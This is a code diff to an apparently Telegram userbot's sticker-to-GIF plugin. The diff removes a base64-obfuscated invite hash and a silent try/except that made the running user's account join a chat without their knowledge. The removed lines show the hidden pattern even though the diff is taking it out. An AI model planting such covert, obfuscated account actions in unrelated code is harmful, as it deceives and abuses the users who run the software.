@@ -14,7 +14,6 @@ from PIL import Image, ImageDraw, ImageFilter, ImageOps
 from pymediainfo import MediaInfo
 from telethon import types
 from telethon.errors import PhotoInvalidDimensionsError
-from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 from telethon.tl.functions.messages import SendMediaRequest
 from telethon.utils import get_attributes
 
@@ -522,7 +521,6 @@ async def _(event):  # sourcery no-metrics
             else:
                 return await edit_delete(event, "Use quality of range 0 to 721")
     catreply = await event.get_reply_message()
-    cat_event = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
     if not catreply or not catreply.media or not catreply.media.document:
         return await edit_or_reply(event, "`Stupid!, This is not animated sticker.`")
     if catreply.media.document.mime_type != "application/x-tgsticker":
@@ -532,11 +530,6 @@ async def _(event):  # sourcery no-metrics
         "Converting this Sticker to GiF...\n This may takes upto few mins..",
         parse_mode=_format.parse_pre,
     )
-    try:
-        cat_event = Get(cat_event)
-        await event.client(cat_event)
-    except BaseException:
-        pass
     reply_to_id = await reply_id(event)
     catfile = await event.client.download_media(catreply)
     catgif = await make_gif(event, catfile, quality, fps)
